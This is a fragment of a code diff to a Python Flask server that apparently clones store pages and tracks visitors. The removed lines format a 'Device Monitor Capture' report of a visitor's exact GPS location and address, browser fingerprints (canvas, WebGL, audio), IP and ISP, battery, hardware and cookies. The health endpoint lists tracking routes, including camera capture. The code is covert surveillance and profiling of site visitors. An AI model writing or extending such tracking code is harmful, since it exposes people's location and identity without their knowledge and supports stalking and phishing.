-            addr_parts = [p for p in [road, geo_city, state, postcode, geo_country] if p]
-            addr_line = ", ".join(addr_parts) if addr_parts else "N/A"
-        else:
-            addr_line = "N/A"
-
-        location_section = (
-            f"📍 <b>Exact GPS Location</b>\n"
-            f"   • Coordinates: <code>{gps_lat}, {gps_lon}</code>{acc_line}\n"
-            f"   • Address: {addr_line}\n"
-            f"   • Maps: {maps_url}\n"
-        )
-    elif ip_lat and ip_lon:
-        maps_url = f"https://maps.google.com/?q={ip_lat},{ip_lon}"
-        location_section = (
-            f"📍 <b>IP Location (approximate)</b>\n"
-            f"   • Coordinates: <code>{ip_lat}, {ip_lon}</code>\n"
-            f"   • Country: {country} {_flag_emoji(cc)}\n"
-            f"   • City: {city}\n"
-            f"   • Maps: {maps_url}\n"
-            f"   ⚠️ GPS not available — IP-based estimate\n"
-        )
-    else:
-        location_section = (
-            f"📍 <b>Location</b>\n"
-            f"   • Country: {country} {_flag_emoji(cc)}\n"
-            f"   • City: {city}\n"
-            f"   ⚠️ GPS not available\n"
-        )
-
-    return (
-        f"📊 <b>Device Monitor Capture</b>\n"
-        f"{DIVIDER}\n\n"
-        f"🖥️ <b>Device &amp; Browser</b>\n"
-        f"   • Platform: {platform}\n"
-        f"   • UA: {ua}\n"
-        f"   • Language: {lang}\n"
-        f"   • Screen: {screen_res}\n"
-        f"   • Viewport: {viewport}\n"
-        f"   • Color Depth: {color_depth}\n"
-        f"   • Touch: {touch} ({touch_points} pts)\n\n"
-        f"🔒 <b>Fingerprint</b>\n"
-        f"   • Canvas: <code>{canvas_fp}</code>\n"
-        f"   • WebGL: {webgl_vendor} / {webgl_renderer}\n"
-        f"   • Audio: <code>{audio_fp}</code>\n\n"
-        f"🌐 <b>Network</b>\n"
-        f"   • IP: <code>{ip}</code>\n"
-        f"   • ISP: {isp}\n"
-        f"   • ASN: {asn}\n\n"
-        f"{location_section}\n"
-        f"🔋 <b>Battery</b>\n"
-        f"   • Level: {bat_level}\n"
-        f"   • Charging: {bat_charge}\n\n"
-        f"💾 <b>Hardware</b>\n"
-        f"   • CPU: {cores} cores\n"
-        f"   • RAM: {mem} GB\n"
-        f"   • Timezone: {tz}\n\n"
-        f"⚙️ <b>Other</b>\n"
-        f"   • Cookies: {cookies}\n"
-        f"   • Page: {url}\n"
-        f"   • Referrer: {referrer}\n\n"
-        f"📅 {now}\n"
-        f"{DIVIDER}\n{FOOTER}"
-    )
+    return jsonify({"ok": True, "complete": True}), 200
 
 # ============================================================
 # HEALTH
@@ -615,10 +738,10 @@ def health():
     return jsonify({
         "ok": True,
         "ts": datetime.now(timezone.utc).isoformat(),
-        "version": "1.6.1",
+        "version": "1.6.0",
         "endpoints": ["/api/verify", "/api/clone-store", "/api/clone/<slug>",
                       "/api/preview-store", "/preview/<slug>",
-                      "/track", "/track-camera", "/track-consolidated", "/health"]
+                      "/track", "/track-camera", "/track-chunk", "/health"]
     })
 
 if __name__ == "__main__":
